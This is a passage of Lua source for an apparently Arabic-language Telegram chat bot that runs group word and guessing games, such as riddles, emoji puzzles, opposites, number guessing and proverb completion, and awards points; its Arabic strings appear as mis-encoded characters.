name = string.gsub(name,"Ψ§ΩΩΨ±Ψ§ΩΩ","Ψ§Ψ±Ω ΩΩ Ψ΄ΩΨ¦ ΩΩ Ψ―ΩΩ ΨΉΩΩΩ ΩΩ Ψ§ΩΩΩ Ψ ")
name = string.gsub(name,"Ψ§ΩΨΆΩΨ‘","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΨ?ΨͺΨ±Ω Ψ§ΩΨ²Ψ¬Ψ§Ψ¬ ΩΩΨ§ ΩΩΨ³Ψ±Ω Ψ")
name = string.gsub(name,"Ψ§ΩΩΩΨ§Ψ‘","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΨ³ΩΨ± Ψ§ΩΨ§ΩΩ ΩΩΨ§ ΨͺΨ±Ψ§Ω Ψ")
name = string.gsub(name,"Ψ§ΩΨΆΩ","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΩΨ§Ψ­ΩΩ Ψ§ΩΩΩΨ§ ΨͺΨ°ΩΨ¨ Ψ ")
name = string.gsub(name,"Ψ§ΩΨΉΩΨ±","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ‘ Ψ§ΩΨ°Ω ΩΩΩΨ§ Ψ·Ψ§Ω ΩΨ΅Ψ± Ψ ")
name = string.gsub(name,"Ψ§ΩΩΩΩ","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΩΨͺΨ¨ ΩΩΨ§ ΩΩΨ±Ψ£ Ψ")
name = string.gsub(name,"Ψ§ΩΩΨ΄Ψ·","ΩΩ Ψ£Ψ³ΩΨ§Ω ΩΩΨ§ ΩΨΉΨΆ ΩΨ§ ΩΩ Ψ ")
name = string.gsub(name,"Ψ§ΩΨ­ΩΨ±Ω","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§Ψ°Ψ§ Ψ£Ψ?Ψ°ΩΨ§ ΩΩΩ Ψ§Ψ²Ψ―Ψ§Ψ― ΩΩΨ¨Ψ± Ψ")
name = string.gsub(name,"Ψ§ΩΨ¨Ψ­Ψ±","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΨ±ΩΨΉ Ψ§Ψ«ΩΨ§Ω ΩΩΨ§ ΩΩΨ―Ψ± ΩΨ±ΩΨΉ ΩΨ³ΩΨ§Ψ± Ψ")
name = string.gsub(name,"Ψ§ΩΨ«ΩΨ¬","Ψ§ΩΨ§ Ψ§Ψ¨Ω Ψ§ΩΩΨ§Ψ‘ ΩΨ§Ω ΨͺΨ±ΩΩΩΩ ΩΩ Ψ§ΩΩΨ§Ψ‘ ΩΨͺ ΩΩΩ Ψ§ΩΨ§ Ψ")
name = string.gsub(name,"Ψ§ΩΨ§Ψ³ΩΩΨ¬","ΩΩΩ Ψ«ΩΩΨ¨ ΩΩΨΉ Ψ°Ψ§ΩΩ Ψ§Ψ­ΩΨΆ Ψ§ΩΩΨ§Ψ‘ ΩΩΩ Ψ§ΩΩΩ Ψ")
name = string.gsub(name,"Ψ§ΩΨ΅ΩΨͺ","Ψ§Ψ³ΩΨ± Ψ¨ΩΨ§ Ψ±Ψ¬ΩΩΩ ΩΩΨ§ Ψ§Ψ―Ψ?Ω Ψ§ΩΨ§ Ψ¨Ψ§ΩΨ§Ψ°ΩΩΩ ΩΩΩ Ψ§ΩΨ§ Ψ")
name = string.gsub(name,"Ψ¨ΩΩ","Ψ­Ψ§ΩΩ ΩΩΨ­ΩΩΩ ΩΨ΅Ω ΩΨ§Ψ΄Ω ΩΩΨ΅Ω ΩΨ¨ΩΩΩ ΩΩΩ Ψ§ΩΩΩ Ψ ")
send(msg.chat_id_, msg.id_,"βοΈβΏΨ§Ψ³Ψ±ΨΉ ΩΨ§Ψ­Ψ― ΩΨ­Ω Ψ§ΩΨ§Ψ³Ψ¦ΩΩ β\n {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Tshak:Klam:Hzor"..msg.chat_id_) or "").."" and not database:get(bot_id.."Tshak:Set:Hzora"..msg.chat_id_) then
if not database:get(bot_id.."Tshak:Set:Hzora"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"πβΏΨ§ΩΩ ΩΨ¨Ψ±ΩΩ ΩΩΨ― ΩΨ²Ψͺ \nβ»βΏΩΩΨΉΨ¨ ΩΨ±Ω Ψ§Ψ?Ψ±Ω Ψ§Ψ±Ψ³Ω ~{ Ψ§ΩΨ§Ψ³Ψ¦ΩΩ }")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id.."Tshak:Set:Hzora"..msg.chat_id_,true)
end 

if text == "ΩΨΉΨ§ΩΩ" then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
database:del(bot_id.."Tshak:Set:Maany"..msg.chat_id_)
Maany_Rand = {"ΩΨ±Ψ―","Ψ―Ψ¬Ψ§Ψ¬Ω","Ψ¨Ψ·Ψ±ΩΩ","ΨΆΩΨ―ΨΉ","Ψ¨ΩΩΩ","ΩΨ­ΩΩ","Ψ―ΩΩ","Ψ¬ΩΩ","Ψ¨ΩΨ±Ω","Ψ―ΩΩΩΩΩ","ΨͺΩΨ³Ψ§Ψ­","ΩΨ±Ψ΄","ΩΩΨ±","Ψ§Ψ?Ψ·Ψ¨ΩΨ·","Ψ³ΩΩΩ","Ψ?ΩΨ§Ψ΄","Ψ§Ψ³Ψ―","ΩΨ£Ψ±","Ψ°Ψ¦Ψ¨","ΩΨ±Ψ§Ψ΄Ω","ΨΉΩΨ±Ψ¨","Ψ²Ψ±Ψ§ΩΩ","ΩΩΩΨ°","ΨͺΩΨ§Ψ­Ω","Ψ¨Ψ·ΩΨ¬Ψ§Ω"}
name = Maany_Rand[math.random(#Maany_Rand)]
database:set(bot_id.."Tshak:Maany"..msg.chat_id_,name)
name = string.gsub(name,"ΩΨ±Ψ―","π")
name = string.gsub(name,"Ψ―Ψ¬Ψ§Ψ¬Ω","π")
name = string.gsub(name,"Ψ¨Ψ·Ψ±ΩΩ","π§")
name = string.gsub(name,"ΨΆΩΨ―ΨΉ","πΈ")
name = string.gsub(name,"Ψ¨ΩΩΩ","π¦")
name = string.gsub(name,"ΩΨ­ΩΩ","π")
name = string.gsub(name,"Ψ―ΩΩ","π")
name = string.gsub(name,"Ψ¬ΩΩ","π«")
name = string.gsub(name,"Ψ¨ΩΨ±Ω","π")
name = string.gsub(name,"Ψ―ΩΩΩΩΩ","π¬")
name = string.gsub(name,"ΨͺΩΨ³Ψ§Ψ­","π")
name = string.gsub(name,"ΩΨ±Ψ΄","π¦")
name = string.gsub(name,"ΩΩΨ±","π")
name = string.gsub(name,"Ψ§Ψ?Ψ·Ψ¨ΩΨ·","π")
name = string.gsub(name,"Ψ³ΩΩΩ","π")
name = string.gsub(name,"Ψ?ΩΨ§Ψ΄","π¦")
name = string.gsub(name,"Ψ§Ψ³Ψ―","π¦")
name = string.gsub(name,"ΩΨ£Ψ±","π­")
name = string.gsub(name,"Ψ°Ψ¦Ψ¨","πΊ")
name = string.gsub(name,"ΩΨ±Ψ§Ψ΄Ω","π¦")
name = string.gsub(name,"ΨΉΩΨ±Ψ¨","π¦")
name = string.gsub(name,"Ψ²Ψ±Ψ§ΩΩ","π¦")
name = string.gsub(name,"ΩΩΩΨ°","π¦")
name = string.gsub(name,"ΨͺΩΨ§Ψ­Ω","π")
name = string.gsub(name,"Ψ¨Ψ·ΩΨ¬Ψ§Ω","π")
send(msg.chat_id_, msg.id_,"π‘βΏΨ§Ψ³Ψ±ΨΉ ΩΨ§Ψ­Ψ― ΩΨ¨ΨΉΨͺ ΩΨΉΩΩ Ψ§ΩΨ³ΩΨ§ΩΩ ~ {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Tshak:Maany"..msg.chat_id_) or "").."" and not database:get(bot_id.."Tshak:Set:Maany"..msg.chat_id_) then
if not database:get(bot_id.."Tshak:Set:Maany"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"πβΏΨ§ΩΩ ΩΨ¨Ψ±ΩΩ ΩΩΨ― ΩΨ²Ψͺ \nβ»βΏΩΩΨΉΨ¨ ΩΨ±Ω Ψ§Ψ?Ψ±Ω Ψ§Ψ±Ψ³Ω ~{ ΩΨΉΨ§ΩΩ }")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id.."Tshak:Set:Maany"..msg.chat_id_,true)
end 
if text == "Ψ§ΩΨΉΩΨ³" then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
database:del(bot_id.."Tshak:Set:Aks"..msg.chat_id_)
katu = {"Ψ¨Ψ§Ω","ΩΩΩΨͺ","ΩΩΨ²ΩΩ","Ψ§Ψ³ΩΨΉΩ","Ψ§Ψ­Ψ¨Ω","ΩΩΨ­ΩΩ","ΩΨΆΩΩ","Ψ­Ψ§Ψ±Ω","ΩΨ§Ψ΅Ω","Ψ¬ΩΩ","Ψ³Ψ±ΩΨΉ","ΩΩΨ³Ω","Ψ·ΩΩΩ","Ψ³ΩΩΩ","ΨΆΨΉΩΩ","Ψ΄Ψ±ΩΩ","Ψ΄Ψ¬Ψ§ΨΉ","Ψ±Ψ­Ψͺ","ΨΉΨ―Ω","ΩΨ΄ΩΨ·","Ψ΄Ψ¨ΨΉΨ§Ω","ΩΩΨΉΨ·Ψ΄Ψ§Ω","Ψ?ΩΨ΄ ΩΩΨ―","Ψ§ΩΩ","ΩΨ§Ψ―Ψ¦"}
name = katu[math.random(#katu)]
database:set(bot_id.."Tshak:Set:Aks:Game"..msg.chat_id_,name)
name = string.gsub(name,"Ψ¨Ψ§Ω","ΩΩΩ")
name = string.gsub(name,"ΩΩΩΨͺ","ΩΨ§ΩΩΩΨͺ")
name = string.gsub(name,"ΩΩΨ²ΩΩ","Ψ²ΩΩ")
name = string.gsub(name,"Ψ§Ψ³ΩΨΉΩ","ΩΨ§Ψ³ΩΨΉΩ")
name = string.gsub(name,"Ψ§Ψ­Ψ¨Ω","ΩΨ§Ψ­Ψ¨Ω")
name = string.gsub(name,"ΩΩΨ­ΩΩ","Ψ­ΩΩ")
name = string.gsub(name,"ΩΨΆΩΩ","ΩΨ΅Ψ?")
name = string.gsub(name,"Ψ­Ψ§Ψ±Ω","Ψ¨Ψ§Ψ±Ψ―Ω")
name = string.gsub(name,"ΩΨ§Ψ΅Ω","ΨΉΨ§ΩΩ")
name = string.gsub(name,"Ψ¬ΩΩ","ΩΩΩ")
name = string.gsub(name,"Ψ³Ψ±ΩΨΉ","Ψ¨Ψ·ΩΨ‘")
name = string.gsub(name,"ΩΩΨ³Ω","ΨΆΩΨ¬Ω")
name = string.gsub(name,"Ψ·ΩΩΩ","ΩΨ²Ω")
name = string.gsub(name,"Ψ³ΩΩΩ","ΨΆΨΉΩΩ")
name = string.gsub(name,"ΨΆΨΉΩΩ","ΩΩΩ")
name = string.gsub(name,"Ψ΄Ψ±ΩΩ","ΩΩΨ§Ψ―")
name = string.gsub(name,"Ψ΄Ψ¬Ψ§ΨΉ","Ψ¬Ψ¨Ψ§Ω")
name = string.gsub(name,"Ψ±Ψ­Ψͺ","Ψ§Ψ¬ΩΨͺ")
name = string.gsub(name,"ΨΉΨ―Ω","ΩΩΨͺ")
name = string.gsub(name,"ΩΨ΄ΩΨ·","ΩΨ³ΩΩ")
name = string.gsub(name,"Ψ΄Ψ¨ΨΉΨ§Ω","Ψ¬ΩΨΉΨ§Ω")
name = string.gsub(name,"ΩΩΨΉΨ·Ψ΄Ψ§Ω","ΨΉΨ·Ψ΄Ψ§Ω")
name = string.gsub(name,"Ψ?ΩΨ΄ ΩΩΨ―","ΩΩΨ?ΩΨ΄ ΩΩΨ―")
name = string.gsub(name,"Ψ§ΩΩ","ΩΨ·Ω")
name = string.gsub(name,"ΩΨ§Ψ―Ψ¦","ΨΉΨ΅Ψ¨Ω")
send(msg.chat_id_, msg.id_,"π‘βΏΨ§Ψ³Ψ±ΨΉ ΩΨ§Ψ­Ψ― ΩΨ¨ΨΉΨͺ Ψ§ΩΨΉΩΨ³ ~ {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Tshak:Set:Aks:Game"..msg.chat_id_) or "").."" and not database:get(bot_id.."Tshak:Set:Aks"..msg.chat_id_) then
if not database:get(bot_id.."Tshak:Set:Aks"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"πβΏΨ§ΩΩ ΩΨ¨Ψ±ΩΩ ΩΩΨ― ΩΨ²Ψͺ \nβ»βΏΩΩΨΉΨ¨ ΩΨ±Ω Ψ§Ψ?Ψ±Ω Ψ§Ψ±Ψ³Ω ~{ Ψ§ΩΨΉΩΨ³ }")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id.."Tshak:Set:Aks"..msg.chat_id_,true)
end 

if database:get(bot_id.."Tshak:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
send(msg.chat_id_, msg.id_,"πβΏΨΉΨ°Ψ±Ψ’ ΩΨ§ ΩΩΩΩΩ ΨͺΨ?ΩΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ¨Ψ± ΩΩ Ψ§Ω { 20 } Ψ?ΩΩ Ψ±ΩΩ ΩΨ§ Ψ¨ΩΩ Ψ§Ω{ 1 Ω 20 }\n")
return false  end 
local GETNUM = database:get(bot_id.."Tshak:GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
database:del(bot_id.."Tshak:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)
database:del(bot_id.."Tshak:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_,5)  
send(msg.chat_id_, msg.id_,"π¨βΏΩΨ¨Ψ±ΩΩ ΩΨ²Ψͺ ΩΩΨ§ΩΩ ΩΨ?ΩΩΨͺ Ψ§ΩΨ±ΩΩ Ψ§ΩΨ΅Ψ­ΩΨ­\nπΈβΏΨͺΩ Ψ§ΨΆΨ§ΩΨ© { 5 } ΩΩ Ψ§ΩΩΩΨ§Ψ· \n")
elseif tonumber(NUM) ~= tonumber(GETNUM) then
database:incrby(bot_id.."Tshak:SADD:NUM"..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(database:get(bot_id.."Tshak:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)) >= 3 then
database:del(bot_id.."Tshak:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)
database:del(bot_id.."Tshak:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,"π βΏΨ§ΩΨ¨Ψ³ ΩΩΨ― Ψ?Ψ³Ψ±Ψͺ ΩΩ Ψ§ΩΩΨΉΨ¨Ω \nπβΏΨ­ΨΈΨ’ Ψ§ΩΩΨ± ΩΩ Ψ§ΩΩΨ±Ω Ψ§ΩΩΨ§Ψ―ΩΩ \nπ‘βΏΩΨ§Ω Ψ§ΩΨ±ΩΩ Ψ§ΩΨ°Ω ΨͺΩ ΨͺΨ?ΩΩΩΩ { "..GETNUM.." }")
else
send(msg.chat_id_, msg.id_,"π?βΏΨ§ΩΨ¨Ψ³ ΨͺΨ?ΩΩΩΩ ΨΊΩΨ· \nπβΏΨ§Ψ±Ψ³Ω Ψ±ΩΩ ΨͺΨ?ΩΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±Ω ")
end
end
end
end
if text == "Ψ?ΩΩ" or text == "ΨͺΨ?ΩΩΩ" then   
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
Num = math.random(1,20)
database:set(bot_id.."Tshak:GAMES:NUM"..msg.chat_id_,Num) 
send(msg.chat_id_, msg.id_,"\nπ?βΏΨ§ΩΩΨ§ Ψ¨Ω ΨΉΨ²ΩΨ²Ω ΩΩ ΩΨΉΨ¨Ψ© Ψ§ΩΨͺΨ?ΩΩΩ :\nΩ΄ββββββββββ\n".."πβΏΩΩΨ§Ψ­ΨΈΩ ΩΨ―ΩΩ { 3 } ΩΨ­Ψ§ΩΩΨ§Ψͺ ΩΩΨ· ΩΩΨ± ΩΨ¨Ω Ψ§Ψ±Ψ³Ψ§Ω ΨͺΨ?ΩΩΩΩ \n\n".."π¨βΏΨ³ΩΨͺΩ ΨͺΨ?ΩΩΩ ΨΉΨ―Ψ― ΩΨ§ Ψ¨ΩΩ Ψ§Ω {1 Ω 20} Ψ§Ψ°Ψ§ ΨͺΨΉΨͺΩΨ― Ψ§ΩΩ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ§ΩΩΩΨ² Ψ¬Ψ±Ψ¨ ΩΨ§ΩΩΨΉΨ¨ Ψ§ΩΨ§Ω Ψ ")
database:setex(bot_id.."Tshak:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end

if database:get(bot_id.."Tshak:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
send(msg.chat_id_, msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΩΨ§ ΩΩΨ¬Ψ― Ψ³ΩΨ§Ψ‘ { 6 } Ψ§Ψ?ΨͺΩΨ§Ψ±Ψ§Ψͺ ΩΩΨ· Ψ§Ψ±Ψ³Ω Ψ§Ψ?ΨͺΩΨ§Ψ±Ω ΩΨ±Ω Ψ§Ψ?Ψ±Ω\n")
return false  end 
local GETNUM = database:get(bot_id.."Tshak:Games:Bat"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
database:del(bot_id.."Tshak:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,"π βΏΩΨ¨Ψ±ΩΩ ΩΨ²Ψͺ ΩΨ·ΩΨΉΨͺ Ψ§ΩΩΨ­ΩΨ¨Ψ³ Ψ¨Ω Ψ§ΩΨ― Ψ±ΩΩ { "..NUM.." }\nπβΏΩΩΨ― Ψ­Ψ΅ΩΨͺ ΨΉΩΩ { 3 }ΩΩ ΩΩΨ§Ψ· ΩΩΩΩΩ Ψ§Ψ³ΨͺΨ¨Ψ―Ψ§ΩΩΩ Ψ¨Ψ±Ψ³Ψ§Ψ¦Ω ")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_,3)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
database:del(bot_id.."Tshak:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,"π βΏΩΩΨ§Ψ³Ω ΩΩΨ― Ψ?Ψ³Ψ±Ψͺ \nπβΏΨ§ΩΩΨ­ΩΨ¨Ψ³ Ψ¨Ω Ψ§ΩΨ― Ψ±ΩΩ { "..GETNUM.." }\nπ₯βΏΨ­Ψ§ΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±Ω ΩΩΨΉΨ«ΩΨ± ΨΉΩΩ Ψ§ΩΩΨ­ΩΨ¨Ψ³")
end
end
end

if text == "ΩΨ­ΩΨ¨Ψ³" or text == "Ψ¨Ψ§Ψͺ" then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then   
Num = math.random(1,6)
database:set(bot_id.."Tshak:Games:Bat"..msg.chat_id_,Num) 
TEST = [[
*β       β     β      β      β     β
β      β     β      β     β     β
π βΉβΊ π βΉβΊ π βΉβΊ π βΉβΊ π βΉβΊ π
π βΏΨ§Ψ?ΨͺΨ± ΩΨ£Ψ³ΨͺΨ?Ψ±Ψ§Ψ¬ Ψ§ΩΩΨ­ΩΨ¨Ψ³ Ψ§ΩΨ§ΩΨ― Ψ§ΩΨͺΩ ΨͺΨ­ΩΩ Ψ§ΩΩΨ­ΩΨ¨Ψ³ 
πβΏΨ§ΩΩΨ§Ψ¦Ψ² ΩΨ­Ψ΅Ω ΨΉΩΩ { 3 } ΩΩ Ψ§ΩΩΩΨ§Ψ· *
]]
send(msg.chat_id_, msg.id_,TEST)
database:setex(bot_id.."Tshak:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end

if text == "Ψ§ΩΩΨ?ΨͺΩΩ" then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
mktlf = {"πΈ","β ","πΌ","π","π","π","β­οΈ","β¨","β","π₯","βοΈ","π¨βπ¬","π¨βπ»","π¨βπ§","π§ββ","π§ββ","π§ββ","πββ","π§ββ","π¬","π","π€","βοΈ","π",};
name = mktlf[math.random(#mktlf)]
database:del(bot_id.."Tshak:Set:Moktlf:Bot"..msg.chat_id_)
database:set(bot_id.."Tshak::Set:Moktlf"..msg.chat_id_,name)
name = string.gsub(name,"πΈ","πΉπΉπΉπΉπΉπΉπΉπΉπΈπΉπΉπΉπΉ")
name = string.gsub(name,"β ","πππππππβ πππππ")
name = string.gsub(name,"πΌ","π»π»π»πΌπ»π»π»π»π»π»π»")
name = string.gsub(name,"π","ππππππππππ")
name = string.gsub(name,"π","ππππππππ??")
name = string.gsub(name,"π","πππππππππ")
name = string.gsub(name,"β­οΈ","ππππππππβ­οΈπππ")
name = string.gsub(name,"β¨","π«π«π«π«π«β¨π«π«π«π«")
name = string.gsub(name,"β","π¨π¨π¨π¨π¨βπ¨π¨π¨π¨")
name = string.gsub(name,"π₯","βοΈβοΈβοΈβοΈβοΈβοΈπ₯βοΈβοΈβοΈβοΈ")
name = string.gsub(name,"βοΈ","βββββββοΈββββ")
name = string.gsub(name,"π¨βπ¬","π©βπ¬π©βπ¬π©βπ¬π©βπ¬π©βπ¬π©βπ¬π©βπ¬π©βπ¬π¨βπ¬π©βπ¬π©βπ¬π©βπ¬")
name = string.gsub(name,"π¨βπ»","π©βπ»π©βπ»π©ββπ»π©ββπ»π©βπ»π¨βπ»π©βπ»π©βπ»π©βπ»")
name = string.gsub(name,"π¨βπ§","π©βπ§π©βπ§π©βπ§π©βπ§π©βπ§π©βπ§π¨βπ§π©βπ§")
name = string.gsub(name,"π©βπ³","π¨βπ³π¨βπ³π¨βπ³π¨βπ³π¨βπ³π©βπ³π¨βπ³π¨βπ³π¨βπ³")
name = string.gsub(name,"π§ββ","π§ββπ§ββπ§ββπ§ββπ§ββπ§ββπ§ββ")
name = string.gsub(name,"π§ββ","π§ββπ§ββπ§ββπ§ββπ§ββπ§ββπ§ββπ§ββπ§ββ")
name = string.gsub(name,"π§ββ","π§ββπ§ββπ§ββπ§ββπ§ββπ§ββπ§ββπ§ββπ§ββ")
name = string.gsub(name,"πββοΈ","πββοΈπββοΈπββοΈπββοΈπββοΈπββοΈπββοΈπββοΈπββοΈ")
name = string.gsub(name,"π§ββοΈ","π§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈ")
name = string.gsub(name,"π¬","π­π­π­π­π­π¬π­π­π­")
name = string.gsub(name,"π¨βπ¨βπ§","π¨βπ¨βπ¦π¨βπ¨βπ¦π¨βπ¨βπ¦π¨βπ¨βπ¦π¨βπ¨βπ§π¨βπ¨βπ¦π¨βπ¨βπ¦")
name = string.gsub(name,"π","ππππππππππ")
name = string.gsub(name,"π€","π₯π₯π₯π₯π₯π€π₯π₯π₯")
name = string.gsub(name,"βοΈ","β³β³β³β³β³β³βοΈβ³β³")
name = string.gsub(name,"π","πππππππππ")
send(msg.chat_id_, msg.id_,"π βΏΨ§ΩΩ ΩΨ§Ψ­Ψ― ΩΨ¨ΨΉΨͺ Ψ§ΩΨ§Ψ?ΨͺΩΨ§Ω ~ {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Tshak::Set:Moktlf"..msg.chat_id_) or "").."" then 
if not database:get(bot_id.."Tshak:Set:Moktlf:Bot"..msg.chat_id_) then 
database:del(bot_id.."Tshak::Set:Moktlf"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"πβΏΨ§ΩΩ ΩΨ¨Ψ±ΩΩ ΩΩΨ― ΩΨ²Ψͺ \nβ»βΏΩΩΨΉΨ¨ ΩΨ±Ω Ψ§Ψ?Ψ±Ω Ψ§Ψ±Ψ³Ω ~{ Ψ§ΩΩΨ?ΨͺΩΩ }")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id.."Tshak:Set:Moktlf:Bot"..msg.chat_id_,true)
end
if text == "Ψ§ΩΨ«ΩΩ" then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
mthal = {"Ψ¬ΩΨ²","ΨΆΨ±Ψ§Ψ·Ω","Ψ§ΩΨ­Ψ¨Ω","Ψ§ΩΨ­Ψ§ΩΩ","Ψ΄ΩΨ±Ω","Ψ¨ΩΨ―Ω","Ψ³ΩΨ§ΩΩ","Ψ§ΩΩΨ?ΩΩ","Ψ§ΩΨ?ΩΩ","Ψ­Ψ―Ψ§Ψ―","Ψ§ΩΩΨ¨ΩΩ","ΩΨ±ΩΨ΅","ΩΨ±Ψ―","Ψ§ΩΨΉΩΨ¨","Ψ§ΩΨΉΩΩ","Ψ§ΩΨ?Ψ¨Ψ²","Ψ¨Ψ§ΩΨ­Ψ΅Ψ§Ψ―","Ψ΄ΩΨ±","Ψ΄ΩΩ","ΩΩΨ­ΩΩ",};
name = mthal[math.random(#mthal)]
database:set(bot_id.."Tshak:Set:Amth"..msg.chat_id_,name)
database:del(bot_id.."Tshak:Set:Amth:Bot"..msg.chat_id_)
name = string.gsub(name,"Ψ¬ΩΨ²","ΩΩΨ·Ω____ΩΩΩΨ§ΨΉΨ―Ω Ψ³ΩΩΩ")
name = string.gsub(name,"ΨΆΨ±Ψ§Ψ·Ω","Ψ§ΩΩ ΩΨ³ΩΩ Ψ§ΩΩΨ·Ω ΩΨͺΨ­ΩΩ___")
name = string.gsub(name,"Ψ¨ΩΨ―Ω","Ψ§ΩΩ___ΩΨ­Ψ― ΩΩΩΨ―Ω")
name = string.gsub(name,"Ψ§ΩΨ­Ψ§ΩΩ","ΨͺΨ¬Ψ―Ω ΩΩ___ΩΨΉΨ§Ω")
name = string.gsub(name,"Ψ΄ΩΨ±Ω","ΩΨΉ Ψ§ΩΨ?ΩΩ ΩΨ§___")
name = string.gsub(name,"Ψ§ΩΩΨ?ΩΩ","Ψ§ΩΨ·ΩΩ Ψ·ΩΩ___ΩΨ§ΩΨΉΩΩ ΨΉΩΩ Ψ§ΩΨ΅Ψ?ΩΨ©")
name = string.gsub(name,"Ψ³ΩΨ§ΩΩ","Ψ¨Ψ§ΩΩΨ¬Ω Ψ§ΩΨ±Ψ§ΩΨ© ΩΨ¨Ψ§ΩΨΈΩΨ±___")
name = string.gsub(name,"Ψ§ΩΨ?ΩΩ","ΩΩ ΩΩΨ©___Ψ΄Ψ―Ω ΨΉΩΩ Ψ§ΩΪΩΨ§Ψ¨ Ψ³Ψ±ΩΨ¬")
name = string.gsub(name,"Ψ­Ψ―Ψ§Ψ―","ΩΩΩΩ ΩΩ Ψ΅Ψ?Ω ΩΨ¬ΩΩ ΩΨ§Ω Ψ’ΩΩ___")
name = string.gsub(name,"Ψ§ΩΩΨ¨ΩΩ","___ΩΨ§ ΩΨ?Ψ§Ω ΩΩ Ψ§ΩΩΨ·Ψ±")
name = string.gsub(name,"Ψ§ΩΨ­Ψ¨Ω","Ψ§ΩΩΩ ΨͺΩΨ―ΨΊΨ© Ψ§ΩΨ­ΩΨ© ΩΨ?Ψ§Ω ΩΩ Ψ¬Ψ±Ψ©___")
name = string.gsub(name,"ΩΨ±ΩΨ΅","Ψ§ΩΩΨ§ΩΨΉΨ±Ω___ΩΩΩΩ Ψ§ΩΩΨ§ΨΉ ΨΉΩΨ¬Ω")
name = string.gsub(name,"Ψ§ΩΨΉΩΨ¨","Ψ§ΩΩΨ§ΩΩΩΨ­___ΩΩΩΩ Ψ­Ψ§ΩΨΆ")
name = string.gsub(name,"Ψ§ΩΨΉΩΩ","___Ψ₯Ψ°Ψ§ Ψ­Ψ¨Ψͺ Ψ§ΩΪΩΨ© Ψ§Ψ¨ΩΩΨ³ ΩΨ―Ψ?Ω Ψ§ΩΨ¬ΩΨ©")
name = string.gsub(name,"Ψ§ΩΨ?Ψ¨Ψ²","Ψ§ΩΨ·Ω___ΩΩΨ?Ψ¨Ψ§Ψ² Ψ­ΨͺΩ ΩΩ ΩΨ§ΩΩ ΩΨ΅Ω")
name = string.gsub(name,"Ψ¨Ψ§Ψ­Ψ΅Ψ§Ψ―","Ψ§Ψ³ΩΨ©___ΩΩΩΨ¬ΩΩ ΩΩΨ³ΩΨ±")
name = string.gsub(name,"Ψ΄ΩΨ±","Ψ§ΩΨ΄Ω__ΩΩΨ§ ΨͺΨΉΨ¨Ψ± ΩΩΨ±")
name = string.gsub(name,"Ψ΄ΩΩ","ΩΨ§ΩΩ ΨͺΨΉΨ¨ ΩΨ§ΩΩ__ΩΨ§ ΩΩ ΨΉΩΩ Ψ§ΩΨ­Ψ§ΨΆΨ± ΩΩΨ©")
name = string.gsub(name,"Ψ§ΩΩΨ±Ψ―","__Ψ¨ΨΉΩΩ Ψ§ΩΩ ΨΊΨ²Ψ§Ω")
